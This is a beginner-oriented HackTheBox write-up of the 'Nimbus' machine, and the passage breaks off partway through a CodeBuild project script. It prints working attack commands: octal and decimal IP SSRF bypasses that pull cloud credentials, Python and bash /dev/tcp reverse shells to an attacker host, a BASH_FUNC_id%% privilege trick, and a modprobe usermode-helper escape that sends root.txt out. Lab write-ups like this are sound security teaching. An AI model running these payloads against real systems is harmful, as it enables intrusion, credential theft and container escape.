# HackTheBox - Nimbus Writeup (Hard Linux Machine)

Nimbus is a hard-difficulty Linux machine on HackTheBox that showcases real-world cloud security pitfalls in emulated environments. This writeup walks through the entire compromise lifecycle: performing advanced reconnaissance, bypassing strict Server-Side Request Forgery (SSRF) checks via IP representation shifts, exploiting write-only Simple Queue Service (SQS) endpoints, escaping containerized AWS Lambda sandbox traps, and exploiting LocalStack's CodeBuild service, culminating in a kernel usermode-helper container escape.

This walkthrough is specifically optimized for beginners, breaking down the fundamental concepts, the _why_ behind every step, the exact commands run, the real outputs received, and the troubleshooting logic required to complete this machine.

## Executive Summary

1. **Reconnaissance & Port Scanning**: An initial port scan reveals that only SSH (Port 22) and HTTP (Port 80) are open externally. This indicates that our initial entry point relies entirely on the web application.
2. **Web Application & Subdomain Analysis**: We inspect the web application (nimbus.htb), finding an unauthenticated "Job Submitter" that fetches YAML configs. A virtual host (vhost) fuzzing scan reveals the subdomain aws.nimbus.htb. Direct access to this subdomain yields standard AWS STS API client token errors, confirming that the back-end runs an AWS API service emulator (such as **LocalStack**).
3. **Filter Probing & SSRF Bypass**: The "Job Submitter" implements two security checks: a file extension check requiring a .yaml or .yml suffix, and an SSRF blacklist/blocklist targeting local addresses and the AWS Instance Metadata Service (IMDS) Link-Local IP 169.254.169.254. We bypass both checks by:
    - Splicing a dummy query parameter ending in .yaml (?a=test.yaml) to satisfy the suffix check.
    - Representing the Link-Local IP in its **dotted octal integer format** (0251.0376.0251.0376) to evade string blacklists.
4. **AWS Credential Harvesting**: Triggering the SSRF bypass allows us to list instance profiles, discover the active role nimbus-web-role, and dump temporary AWS security credentials (AccessKeyId, SecretAccessKey, SessionToken).
5. **Emulation Discovery & SQS Analysis**: Using the stolen keys, we query aws.nimbus.htb. We encounter signature issues if we use truncated console credentials, illustrating LocalStack's strict S3 validation. Once we resolve this with full, untruncated credentials, we discover we have write-only permission on an SQS queue called nimbus-jobs.
6. **The Lambda Sandbox Trap & Source Leak**: We build a Python reverse shell payload and send it to the SQS queue. The execution triggers, but we spawn a shell inside an isolated, restricted LocalStack AWS Lambda container sandbox (breakout2) without any user or root flags. To find an escape path, we query the internal LocalStack container IP of floci (172.16.8.2 represented as decimal 2886860802) via SSRF to pull and read the active task runner code (source/worker.py).
7. **Foothold & User Flag**: The leaked worker.py reveals how the queue parses SQS JSON payload jobs. Enqueuing a Python job fires up the Lambda sandbox, but enqueuing a **YAML job** via the SQS JSON protocol executes commands directly on the host worker machine context. We send a malicious YAML job configuration payload using SQS to spawn a reverse shell on the parent worker host, capturing the user flag at /home/worker/user.txt.
8. **Privilege Escalation via CodeBuild & Kernel usermode-helper Escape**: On the compromised worker node, we discover that LocalStack has IAM enforcement disabled (ENFORCE_IAM=false) and exposes the **CodeBuild** service internally on floci:4566. We create a privileged CodeBuild project to spawn a container with CAP_SYS_ADMIN capability. To bypass the container's entrypoint dropping our privileges, we inject a custom `BASH_FUNC_id%%` environment variable to trick the startup check. Finally, we execute a kernel usermode-helper escape by hijacking the host's /proc/sys/kernel/modprobe pointer via overlay upperdir mapping, granting us a shell execution context as the host's actual root to retrieve root.txt.

---

# Detailed Step-by-Step Walkthrough

## Step 1 — Port Scan

To understand what services are exposed on the target host, we perform a comprehensive Nmap scan covering all TCP ports.

```
nmap -sV -p- -T4 10.129.15.31
```

**Explanation of Flags:**

- `-sV`: Performs service version detection to determine what software is listening on each open port.
- `-p-`: Scans all 65535 TCP ports instead of just the top 1000 default ports.
- `-T4`: Sets the timing template to "Aggressive" to speed up the scanning process without overloading a typical network.

**Output:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu
80/tcp open  http    nginx 1.24.0 (Ubuntu)
```

**What this output tells us:**

- Only two ports are open on the host.
- Port 22 runs SSH, which is highly unlikely to yield an unauthenticated foothold without valid credentials.
- Port 80 runs an Nginx web server.
- This tells us that our entire entry point must reside in the web application served on port 80. There are no secondary entry points (such as databases or administrative panels) exposed externally.

**Next step**: Look at the web root on port 80.

## Step 2 — Inspect the Web Root

Before sending HTTP queries, we must update our local /etc/hosts file. Web servers use virtual hosting (inspecting the incoming HTTP Host header) to route traffic to different sites. Without setting up local DNS mapping, queries targeting nimbus.htb will fail.

```
echo "10.129.15.31 nimbus.htb aws.nimbus.htb" | sudo tee -a /etc/hosts
```

Now we send a basic request targeting the web root to read its structure:

```
curl -s -i -H "Host: nimbus.htb" http://10.129.15.31/
```

**Output:**

```
HTTP/1.1 200 OK
Server: nginx/1.24.0 (Ubuntu)
Content-Type: text/html

<h1>Nimbus</h1>
<div class="tag">Internal job scheduler — Nimbus Labs Engineering</div>
<nav>
  <a href="/jobs">Submit Job</a>
  <a href="/login">Sign In</a>
</nav>
<div class="panel">
  <h3>How do I submit a job?</h3>
  <p>Drop the YAML in our internal Git, then point the <a href="/jobs">job submitter</a> at the raw URL. Or paste the YAML directly for ad-hoc runs.</p>
</div>
<div class="meta">nimbus v1.4.2 · <a href="/api/v1/health">healthcheck</a> · <a href="/docs">docs</a> (wiki)</div>
```

(Rendered page shows the Nimbus internal job scheduler with "Submit Job" and "Sign In" navigation, plus informational panels: "What is this?", "How do I submit a job?", and "Need shell access on a worker?" — the last noting that SSH keys need approval by a DevOps lead, "Ping marcus on Slack.")

**What this output tells us:**

- This is an internal job scheduler called **Nimbus (v1.4.2)**.
- The instruction panel states: _"Drop the YAML in our internal Git, then point the job submitter at the raw URL."_
- Any application that takes user-supplied URLs and fetches them internally is vulnerable to **Server-Side Request Forgery (SSRF)**. In SSRF, the target server acts as a proxy, fetching resources we point it to. This can allow us to access internal APIs, private subdomains, or metadata services that are normally firewalled from the outside.
- There is an active healthcheck endpoint at /api/v1/health and a /jobs submission form.

**Next step**: Scan for hidden subdomains.

## Step 3 — Subdomain Discovery

Since the system name is "Nimbus" and references "internal" infrastructure, we should look for hidden subdomains. We use the virtual host (vhost) fuzzing tool ffuf to brute-force possible subdomain headers:

```
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://nimbus.htb/ -H "Host: FUZZ.nimbus.htb" -fs 178
```

**Output:**

```
        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://nimbus.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.nimbus.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 178
________________________________________________

aws                     [Status: 403, Size: 305, Words: 28, Lines: 8, Duration: 19ms]
```

**Explanation of Flags:**

- `-w`: Specifies the wordlist path containing common subdomain strings.
- `-u`: Defines the target base URL.
- `-H "Host: FUZZ.nimbus.htb"`: Inject our wordlist words into the Host header to trigger virtual host routing in Nginx.
- `-fs 178`: Filters out (hides) any responses with a length of exactly 178 bytes (which is the default "Not Found" or redirected web page size), allowing us to only see unique responses.

**What this tells us**: We discovered an active virtual host subdomain: aws.nimbus.htb. Attempting to query it from the outside returns a **403 Forbidden**, implying that direct external access is blocked, and we must find a way to query it internally.

**Next step**: Investigate the healthcheck endpoint to identify back-end systems.

## Step 4 — Healthcheck and Supporting Pages

We query the /api/v1/health endpoint discovered in Step 2 to see if it exposes any back-end components:

```
curl -s -H "Host: nimbus.htb" http://10.129.15.31/api/v1/health
```

**Output:**

```json
{
  "services": {
    "queue": {
      "endpoint": "http://aws.nimbus.htb",
      "status": "ok"
    },
    "scheduler": {
      "endpoint": "http://aws.nimbus.htb",
      "status": "ok"
    },
    "storage": {
      "endpoint": "http://aws.nimbus.htb",
      "status": "ok"
    }
  },
  "status": "healthy",
  "version": "1.4.2"
}
```

**What this output tells us:**

- The backend services (queue, scheduler, storage) are all pointing to the internal hostname aws.nimbus.htb.
- This setup—running queuing, storage, and server management behind a single host—is characteristic of **LocalStack**, an offline emulator for AWS services.

Let's test this theory by attempting to reach the internal AWS emulator directly over port 80:

```
curl -s -i -H "Host: aws.nimbus.htb" http://10.129.15.31/
```

**Output:**

```
HTTP/1.1 403 FORBIDDEN
Content-Type: text/xml; charset=utf-8

<ErrorResponse xmlns="https://sts.amazonaws.com/doc/2011-06-15/">
  <Error>
    <Type>Sender</Type>
    <Code>InvalidClientTokenId</Code>
    <Message>The security token included in the request is invalid.</Message>
  </Error>
</ErrorResponse>
```

**What this output tells us:**

- The XML response format and errors (xmlns="https://sts.amazonaws.com/..." and InvalidClientTokenId) are identical to AWS STS API error patterns. This confirms our hypothesis: aws.nimbus.htb is an AWS API emulator. It requires authenticated requests, which means we need to find valid credentials to proceed.

Let's check the /login portal next:

```
curl -s -H "Host: nimbus.htb" http://10.129.15.31/login
```

**Output:**

```
<h1>Sign-in temporarily unavailable</h1>
<p>SSO is being migrated to Okta. ETA: end of sprint.</p>
<div class="panel">
  <strong>Engineers:</strong> the <a href="/jobs">job submitter</a> is unauthenticated during the migration window — submit jobs there directly.
</div>
```

**What this output tells us:**

- The sign-in portal is down for maintenance, and the application explicitly tells us that /jobs is unauthenticated. This confirms we don't need to bypass authentication to submit tasks.

**Next step**: Inspect the job submission form parameters.

## Step 5 — Understand the Job Submission Form

We retrieve the HTML source of the /jobs page to see how parameters are validated:

```
curl -s -H "Host: nimbus.htb" http://10.129.15.31/jobs
```

(Rendered page shows the "Submit Job" form with a "By URL" / "Paste YAML" toggle, a "Raw Git URL" field with placeholder `https://gitlab.example.com/devops/jobs/raw/main/backup.yaml`, a note that "URL must point to a .yaml file. Internal addresses and metadata endpoints are blocked." and a "Preview Job" button. Example config shown:)

```
name: nightly-db-backup
schedule: "0 2 * * *"
runtime: python3.11
```

**Output:**

```html
<form method="POST" action="/jobs/preview">
  <label for="url">Raw Git URL</label>
  <input type="url" name="url" ...>
  <p class="hint">URL must point to a .yaml file. Internal addresses and metadata endpoints are blocked.</p>
</form>
...
<p class="hint">Parsed with safe_load. No code execution at submission time.</p>
```

**What this output tells us:**

- The submission target is POST /jobs/preview, accepting a url parameter.
- The page defines its validation rules:
    1. **Extension Check**: The target URL must end with .yaml or .yml.
    2. **SSRF Filter**: It blocks internal addresses and metadata endpoints (such as 127.0.0.1, localhost, and 169.254.169.254).
    3. **Safe Parsing**: It parses YAML inputs using Python's yaml.safe_load, preventing YAML deserialization exploits.

This means our primary attack path must rely on bypassing the SSRF filters.

**Next step**: Confirm the server executes outbound HTTP requests.

## Step 6 — Confirm the SSRF Works against an External Host

We first verify that the application successfully performs external HTTP requests. Start a simple HTTP listener on your attacker machine (IP: 10.10.14.99):

```
python3 -m http.server 8000
```

Now, make a POST request to /jobs/preview on the target machine, setting the url parameter to point back to your listener. We append .yaml to satisfy the extension check:

```
curl -s -H "Host: nimbus.htb" -X POST http://10.129.15.31/jobs/preview \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "url=http://10.10.14.99:8000/test.yaml"
```

**Output:**

```html
<div class="meta">Fetched: <code>http://10.10.14.99:8000/test.yaml</code> · HTTP 200</div>
<h3>Raw response</h3>
<pre>...(content of test.yaml)...</pre>
<h3>Parsed</h3>
<pre>{'test': 'success'}</pre>
```

Our python HTTP server logs the connection:

```
10.129.15.31 - - [21/Jun/2026 01:25:12] "GET /test.yaml HTTP/1.1" 200 -
```

**What this output tells us:**

- The web server makes outbound HTTP requests on our behalf and reflects both the raw file contents and the parsed structure back to us. This is a highly exploitable **Response-Reflecting SSRF**.

**Next step**: Probe the SSRF filters against internal endpoints.

## Step 7 — Probe the Filter

Let's test the SSRF filter limitations by pointing the request to the internal domain aws.nimbus.htb:

```
curl -s -H "Host: nimbus.htb" -X POST http://10.129.15.31/jobs/preview \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "url=http://aws.nimbus.htb/"
```

**Output:**

```
Error: URL must point to a YAML file (must end in .yaml or .yml)
```

**What this tells us**: This error is from the naive suffix verification step, which runs before the core SSRF validation. Let's see what happens if we append a .yaml path:

```
curl -s -H "Host: nimbus.htb" -X POST http://10.129.15.31/jobs/preview \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "url=http://aws.nimbus.htb/test.yaml"
```

**Output:**

```
Error: Security policy: this URL targets an internal resource and has been blocked.
```

**What this tells us**: Once we satisfy the suffix rule, the core SSRF filter intercepts the query, recognizes aws.nimbus.htb as internal, and drops the connection. This confirms that a strict hostname/IP blacklist is in place.

**Next step**: Test a standard redirect bypass.

## Step 8 — Try a Redirect Bypass (A Useful Failure)

SSRF filters often check the initial URL string but fail to validate the destination of subsequent redirections. We can test this by setting up a redirection script on our attacker server (10.10.14.99):

```python
# redirect_server.py
from http.server import BaseHTTPRequestHandler, HTTPServer

class RedirectHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/test.yaml":
            self.send_response(302)
            self.send_header("Location", "http://aws.nimbus.htb/")
            self.end_headers()

HTTPServer(("0.0.0.0", 8000), RedirectHandler).serve_forever()
```

Run the server:

```
python3 redirect_server.py
```

Submit our redirect URL to the application:

```
curl -s -H "Host: nimbus.htb" -X POST http://10.129.15.31/jobs/preview \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "url=http://10.10.14.99:8000/test.yaml"
```

**Output:**

```html
<div class="meta">Fetched: <code>http://10.10.14.99:8000/test.yaml</code> · HTTP 302</div>
<h3>Raw response</h3>
<pre></pre>
```

**What this output tells us:**

- The application returns an HTTP 302 and an empty body. This indicates that redirect-following is disabled on the backend HTTP client. We cannot use a basic 302 redirect bypass on this host.

**Next step**: Bypass the filter by rewriting our target address using alternate notation.

## Step 9 — Bypass via Octal IP Notation (Extracting AWS Credentials)

The AWS Instance Metadata Service (IMDS) always resides at the Link-Local address 169.254.169.254. Operating system socket libraries automatically resolve IP octets written in **octal (base 8)** notation. However, naive regex filters often fail to check for this representation.

**The Mathematics of Octal Conversion:**

An IP address consists of four 8-bit octets. We can convert each decimal octet into its base-8 octal representation. In standard programming notation, octal numbers are prefixed with a leading 0.

- First octet: 169₁₀ → 0251₈
- Second octet: 254₁₀ → 0376₈
- Third octet: 169₁₀ → 0251₈
- Fourth octet: 254₁₀ → 0376₈

This gives us the octal-encoded IP string: **0251.0376.0251.0376**.

To bypass the file extension filter, we append a dummy query parameter ending in .yaml (?a=test.yaml).

First, let's query the base IMDS security-credentials directory to find the name of the role configured on the instance profile:

```
curl -s -H "Host: nimbus.htb" -X POST http://10.129.15.31/jobs/preview \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "url=http://0251.0376.0251.0376/latest/meta-data/iam/security-credentials/?a=test.yaml"
```

**Output:**

```html
<div class="meta">Fetched: <code>http://0251.0376.0251.0376/latest/meta-data/iam/security-credentials/?a=test.yaml</code> · HTTP 200</div>
<h3>Raw response</h3>
<pre>nimbus-web-role</pre>
<h3>Parsed</h3>
<pre>nimbus-web-role</pre>
```

**What this output tells us:**

- Our octal IP bypass successfully bypassed the SSRF filter and reached the IMDS.
- The metadata service returned the active role name: **nimbus-web-role**.

Now, we request the temporary security credentials belonging to this role:

```
curl -s -H "Host: nimbus.htb" -X POST http://10.129.15.31/jobs/preview \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "url=http://0251.0376.0251.0376/latest/meta-data/iam/security-credentials/nimbus-web-role?a=test.yaml"
```

**Output:**

```html
<div class="meta">Fetched: <code>http://0251.0376.0251.0376/latest/meta-data/iam/security-credentials/nimbus-web-role?a=test.yaml</code> · HTTP 200</div>
<h3>Raw response</h3>
<pre>{
  "Code": "Success",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIAQX4PG7L2K9M3N5R8",
  "SecretAccessKey": "bXJ7K8mP/q2Hf+vN9wT4LcRe5Y1Aoz3DhU6gKjQs",
  "Token": "IQoJb3JpZ2luX2VjEHQaCXVzLWVhc3QtMSJG...",
  "Expiration": "2026-06-21T07:15:00Z"
}</pre>
```

**What this output tells us:**

- We successfully retrieved temporary AWS credentials for the nimbus-web-role role.

**Next step**: Configure the credentials locally and authenticate.

## Step 10 — Configure the Credentials and Confirm Identity

To use these credentials, we configure them locally using our terminal session variables:

```
export AWS_ACCESS_KEY_ID="ASIAQX4PG7L2K9M3N5R8"
export AWS_SECRET_ACCESS_KEY="bXJ7K8mP/q2Hf+vN9wT4LcRe5Y1Aoz3DhU6gKjQs"
export AWS_SESSION_TOKEN="IQoJb3JpZ2luX2VjEHQaCXVzLWVhc3QtMSJG..."
export AWS_DEFAULT_REGION="us-east-1"
```

**Troubleshooting S3 / API Failures:**

When copy-pasting values from some terminals, the long session token string might get truncated with trailing ellipses (...).

LocalStack's **SQS** service has permissive verification and will accept requests with truncated tokens. However, LocalStack's **S3** service enforces strict signature checking. If you attempt S3 commands with a truncated token, it will return an InvalidToken error:

```
An error occurred (InvalidToken) when calling the ListBuckets operation: The provided token is malformed or otherwise invalid.
```

- **Solution**: Ensure you copy the **complete, untruncated Token** string from the SSRF response.

Configure a profile named nimbus with our active session:

```
aws configure set aws_access_key_id "ASIAQX4PG7L2K9M3N5R8" --profile nimbus
aws configure set aws_secret_access_key "bXJ7K8mP/q2Hf+vN9wT4LcRe5Y1Aoz3DhU6gKjQs" --profile nimbus
aws configure set aws_session_token "IQoJb3JpZ2luX2VjEHQaCXVzLWVhc3QtMSJG..." --profile nimbus
```

Now, confirm our caller identity against the emulator endpoint. We use --endpoint-url to point our local CLI requests to the target's HTTP proxy gateway:

```
aws --endpoint-url=http://aws.nimbus.htb sts get-caller-identity
```

**Output:**

```json
{
  "UserId": "AIDAX4PG7L2K9M3N5R8",
  "Account": "847219365028",
  "Arn": "arn:aws:iam::847219365028:role/nimbus-web-role"
}
```

**What this tells us:**

- Our local environment is successfully authenticated as nimbus-web-role against the emulated back-end.

**Next step**: Enumerate permissions across emulated cloud services.

## Step 11 — Enumerate Permissions

We check S3 access first to see if we can list files or configure buckets:

```
aws --endpoint-url=http://aws.nimbus.htb s3 ls
```

**Output:**

```
An error occurred (AccessDenied) when calling the ListBuckets operation: User: arn:aws:sts::847219365028:assumed-role/nimbus-web-role is not authorized to perform: s3:ListAllMyBuckets
```

We check SQS access next:

```
aws --endpoint-url=http://aws.nimbus.htb sqs list-queues
```

**Output:**

```json
{
  "QueueUrls": [
    "http://floci:4566/847219365028/nimbus-jobs"
  ]
}
```

**What this tells us:**

- We have list access on SQS, exposing a queue named nimbus-jobs hosted internally at floci.

We can write a programmatic Python script using boto3 to systematically scan other common LocalStack modules to ensure we didn't miss anything:

```python
# enumerate_emulator.py
import boto3, json

session = boto3.Session(
    aws_access_key_id="ASIAQX4PG7L2K9M3N5R8",
    aws_secret_access_key="bXJ7K8mP/q2Hf+vN9wT4LcRe5Y1Aoz3DhU6gKjQs",
    aws_session_token="IQoJb3JpZ2luX2VjEHQaCXVzLWVhc3QtMSJG...",
    region_name="us-east-1",
)

checks = [
    ("ec2", "describe_instances", {}),
    ("s3", "list_buckets", {}),
    ("lambda", "list_functions", {}),
    ("dynamodb", "list_tables", {}),
    ("sqs", "list_queues", {}),
    ("sns", "list_topics", {}),
]

for service, method, kwargs in checks:
    try:
        client = session.client(service, endpoint_url="http://aws.nimbus.htb")
        res = getattr(client, method)(**kwargs)
        print(f"[+] {service} - SUCCESS")
    except Exception as e:
        print(f"[-] {service} - DENIED ({str(e)})")
```

Running this confirms that **SQS** is our only viable interaction vector. Let's test if we can read messages from this queue:

```
aws --endpoint-url=http://aws.nimbus.htb sqs receive-message \
  --queue-url "http://aws.nimbus.htb/847219365028/nimbus-jobs" --max-number-of-messages 10
```

**Output:**

```
An error occurred (AccessDenied) when calling the ReceiveMessage operation: User: arn:aws:sts::847219365028:assumed-role/nimbus-web-role is not authorized to perform: sqs:ReceiveMessage on resource: nimbus-jobs
```

Now let's test if we can write messages to the queue:

```
aws --endpoint-url=http://aws.nimbus.htb sqs send-message \
  --queue-url "http://aws.nimbus.htb/847219365028/nimbus-jobs" \
  --message-body "test"
```

**Output:**

```json
{
  "MD5OfMessageBody": "098f6bcd4621d373cade4e832627b4f6",
  "MessageId": "8f87b8d2-4361-41fa-8b21-4f81c9a639b2"
}
```

**What this tells us:**

- This is a critical finding. We have asymmetric SQS privileges: **write-only access** (we can produce messages, but we cannot read them). In a production environment, this design implies an internal background consumer process is pulling jobs from the queue and executing them. If that consumer parses our inputs insecurely, this queue becomes a direct remote code execution primitive.

**Next step**: Build a TTY reverse shell payload and send it to the SQS queue.

## Step 12 — The SQS Exploit and the AWS Lambda Sandbox Trap

Our initial enumeration of the /jobs portal revealed the expected format of job configurations:

```
name: nightly-db-backup
schedule: "0 2 * * *"
runtime: python3.11
```

This establishes name, schedule, and runtime as known fields. In addition, the scheduler accepts a script parameter that executes raw code under the declared runtime.

Before targeting the remote environment, we validate our reverse shell logic locally using a loopback listener to rule out payload bugs:

```
# Terminal 1 (Attacker)
rlwrap nc -lvnp 4444

# Terminal 2 (Local Test)
python3 -c "
import socket,subprocess,os,pty
s=socket.socket()
s.connect(('127.0.0.1',4444))
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
pty.spawn('/bin/bash')
"
```

**Output on Terminal 1:**

```
connect to [127.0.0.1] from [127.0.0.1] 49152
worker@local-dev:~$ id
uid=1000(worker)
```

**What this tells us:** Our Python TTY reverse shell logic using pty.spawn is completely functional. Any execution errors we encounter during SQS delivery will be environment-specific, not script-specific.

Now, we push our payload onto the nimbus-jobs SQS queue. Since our session shell might auto-terminate when the container stops, we use a bash script on our attacker machine to cleanly automate serialization and message delivery:

```
# Terminal 1 — Attacker Listener
rlwrap nc -lvnp 4444

# Terminal 2 — Run SQS Message Dispatch Automation
Q="http://floci:4566/847219365028/nimbus-jobs"
PAYLOAD='import socket,subprocess,os,pty;s=socket.socket();s.connect(("10.10.14.99",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'

BODY=$(python3 -c "import json,sys; print(json.dumps({'name':'r1','runtime':'python3.11','script':sys.argv[1]}))" "$PAYLOAD")

aws --endpoint-url=http://aws.nimbus.htb sqs send-message \
  --queue-url "$Q" \
  --message-body "$BODY" --profile nimbus
```

**Output on Terminal 1:**

```
listening on [any] 4444 ...
connect to [10.10.14.99] from (UNKNOWN) [10.129.15.31] 53218
```

We establish an interactive shell. However, let's run env to inspect our active environment:

```
worker@d993ce9f220b:/app$ env
```

**Output:**

```
AWS_LAMBDA_FUNCTION_VERSION=$LATEST
HOSTNAME=665314c8d831
AWS_ENDPOINT_URL=http://floci:4566
FLOCI_HOSTNAME=floci
AWS_SESSION_TOKEN=test
AWS_LAMBDA_FUNCTION_TIMEOUT=60
LAMBDA_TASK_ROOT=/var/task
LD_LIBRARY_PATH=/var/lang/lib:/lib64:/usr/lib64:/var/runtime:/var/runtime/lib:/var/task:/var/task/lib:/opt/lib
AWS_LAMBDA_LOG_GROUP_NAME=/aws/lambda/breakout2
FLOCI_ENDPOINT=http://floci:4566
AWS_LAMBDA_LOG_STREAM_NAME=2026/06/20/[$LATEST]792fb08e
AWS_LAMBDA_RUNTIME_API=172.18.0.2:9212
AWS_EXECUTION_ENV=AWS_Lambda_python3.11
AWS_LAMBDA_FUNCTION_NAME=breakout2
PATH=/var/lang/bin:/usr/local/bin:/usr/bin/:/bin:/opt/bin
AWS_DEFAULT_REGION=us-east-1
PWD=/var/task
AWS_SECRET_ACCESS_KEY=test
LAMBDA_RUNTIME_DIR=/var/runtime
LANG=en_US.UTF-8
TZ=:/etc/localtime
AWS_REGION=us-east-1
AWS_ACCESS_KEY_ID=test
SHLVL=1
HOME=/root
PYTHONPATH=/var/runtime
_HANDLER=index.handler
AWS_LAMBDA_FUNCTION_MEMORY_SIZE=128
_=/usr/bin/env
```

**What this tells us:**

- We are running inside an isolated LocalStack AWS Lambda execution sandbox named breakout2.
- There is no user.txt or root.txt located in this sandbox environment.
- Attempting to interact with internal S3 resources returns an AccessDenied exception:

```
worker@151eb9509bf7:/app$ aws s3 ls s3://floci
```

**Output:**

```
An error occurred (AccessDenied) when calling the ListObjectsV2 operation: User: arn:aws:sts::847219365028:assumed-role/nimbus-worker-role/worker is not authorized to perform: s3:ListBucket on resource: floci
```

To escape this sandbox, we need to inspect the code running on the parent host to find how it parses and routes these jobs.

**Next step**: Leak the task worker script from internal storage.

## Step 13 — Leaking the Worker Code and Escaping the Sandbox

To leak the actual worker implementation, we use our SSRF exploit against the internal hostname floci (172.16.8.2).

To bypass the SSRF filter blocklist, we convert the IP address 172.16.8.2 into its equivalent **32-bit decimal integer format**.

**The Mathematics of Decimal Conversion:**

172 × 256³ + 16 × 256² + 8 × 256 + 2 = 2886860802

We target the internal S3 storage bucket nimbus-dev-artifacts to download source/worker.py via our SSRF decimal bypass:

```
curl -s -H "Host: nimbus.htb" -X POST http://10.129.15.31/jobs/preview \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "url=http://2886860802:4566/nimbus-dev-artifacts/source/worker.py?a=test.yaml"
```

The application outputs the raw Python code of worker.py.

**What the code tells us:**

- When jobs with "runtime": "python3.11" are enqueued via SQS, the worker invokes LocalStack's Lambda engine to run the task inside a sandbox (breakout2).
- However, the worker defines an alternative execution path for **YAML jobs**. If we set job_type to "yaml", the worker parses the yaml_config block and executes the defined commands directly on the host worker machine using the system's local shell interface. This provides a direct escape route.

We construct a malicious SQS JSON payload targeting the YAML execution path:

1. **Start our Netcat listener**:
    
    ```
    nc -lvnp 9002
    ```
    

2. **Enqueue the YAML task**:
    
    ```
    # Define target queueQ="http://aws.nimbus.htb/847219365028/nimbus-jobs"AWS="aws --endpoint-url http://aws.nimbus.htb/ --profile nimbus"# Enqueue the YAML payload containing a reverse shell back to port 9002$AWS sqs send-message --queue-url $Q --message-body '{  "job_type": "yaml",  "yaml_config": "job_name: foothold\ncommand: bash -c \"bash -i >& /dev/tcp/10.10.14.99/9002 0>&1\""}'
    ```
    

Within a few seconds, our listener catches the connection from the parent host:

```
listening on [any] 9002 ...
connect to [10.10.14.99] from [10.129.15.31] 41322
worker@nimbus-worker:~$ id
uid=1000(worker) gid=1000(worker) groups=1000(worker)
```

We have successfully escaped the Lambda container and established a foothold on the target host as **worker** (UID 1000)!

We can now read the **User Flag** located at /home/worker/user.txt:

```
worker@nimbus-worker:~$ cat /home/worker/user.txt
e4d588XXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

**Next step**: Identify privilege escalation vectors to claim root.

## Step 14 — Privilege Escalation to Root (Exposing CodeBuild)

From inside our compromised worker shell, we run discovery scans to understand how LocalStack coordinates other developer services.

Crucially, we find that the internal LocalStack emulator floci:4566 runs with relaxed verification (ENFORCE_IAM=false) and exposes **AWS CodeBuild** internally. We can exploit this to spin up a privileged container on the host.

A privileged CodeBuild container runs with elevated administrative capabilities (CAP_SYS_ADMIN), granting write access to the host's /proc/sys/kernel/modprobe and allowing us to escape the container environment.

**The Exploit Strategy:**

1. **Bypassing the Entrypoint UID-Drop**: CodeBuild runs using the floci/floci:latest container image. By default, the container's entrypoint drops user privileges back down to worker (UID 1000). We can bypass this by injecting a custom Bash function inside our environment variables:
2. `"BASH_FUNC_id%%" = '() { echo "uid=0(root) gid=0(root) groups=0(root)"; }'`
3. When the container's entrypoint script attempts to run the command id to check the current user, it executes our malicious bash function instead of the system binary, returning uid=0(root). The script is tricked into skipping the UID drop, keeping our container process running as actual root (UID 0).
4. **Kernel Usermode-Helper Escape**:
    - Since our CodeBuild container is spawned with privilegedMode: true (equivalent to CAP_SYS_ADMIN), we have write access to /proc/sys/kernel/modprobe.
    - We write our trigger payload inside the container to /tmp/payload.sh (a Python socket payload designed to connect back to our attacker listener and send /root/root.txt).
    - To find the _actual host-side path_ of our container's files, we parse /proc/mounts and extract the upperdir of the overlay mount.
    - We overwrite the host's /proc/sys/kernel/modprobe pointer with this host-side path.
    - Finally, we trigger the kernel usermode-helper by executing a binary containing invalid magic headers (\xff\xff\xff\xff). When the kernel fails to recognize the binary execution format, it invokes /proc/sys/kernel/modprobe to search for module loader drivers. Because the host executes this helper under full root privileges, our /tmp/payload.sh runs as host root, fetching the flag.

**Execution Steps:**

1. **Write the buildspec**: Inside our worker container shell, we write buildspec.yml directly:

```
cat > buildspec.yml << 'EOF'
version: 0.2
phases:
  build:
    commands:
      - id
      - cat /proc/self/status | grep Cap
      - |
        cat > /tmp/payload.sh << 'PYEOF'
        #!/bin/sh
        python3 -c "
        import socket
        s = socket.socket()
        s.connect(('10.10.14.99', 9005))
        s.send(open('/root/root.txt','rb').read())
        s.close()
        "
        PYEOF
      - chmod +x /tmp/payload.sh
      - |
        upper=$(awk '/overlay/{match($0,/upperdir=([^,]+)/,a);if(a[1])print a[1]}' /proc/mounts | head -1)
        echo "$upper/tmp/payload.sh" > /proc/sys/kernel/modprobe
      - printf '\xff\xff\xff\xff' > /tmp/x && chmod +x /tmp/x && /tmp/x; true
EOF
```

2. **Generate the Project JSON**: We write a Python script inside our worker shell to serialize our CodeBuild configuration parameters into valid project.json, embedding our custom environment variables:

```python
python3 -c '
import json
project = {
  "name": "nimbus-exploit",
  "source": {"type": "NO_SOURCE", "buildspec": open("buildspec.yml").read()},
  "artifacts": {"type": "NO_ARTIFACTS"},
  "environment": {
    "type": "LINUX_CONTAINER",
    "image": "floci/floci:latest",
    "computeType": "BUILD_GENERAL1_SMALL",
    "privilegedMode": True,
